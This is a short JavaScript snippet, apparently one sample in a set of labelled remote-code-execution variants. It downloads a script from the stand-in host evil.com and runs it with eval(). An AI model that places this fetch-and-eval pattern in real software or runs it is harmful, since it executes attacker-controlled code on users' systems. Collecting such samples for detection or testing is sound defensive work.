// Remote Code Execution - Fetch Eval Variant 2
fetch('http://evil.com/payload.js')
    .then(res => res.text())
    .then(code => eval(code));
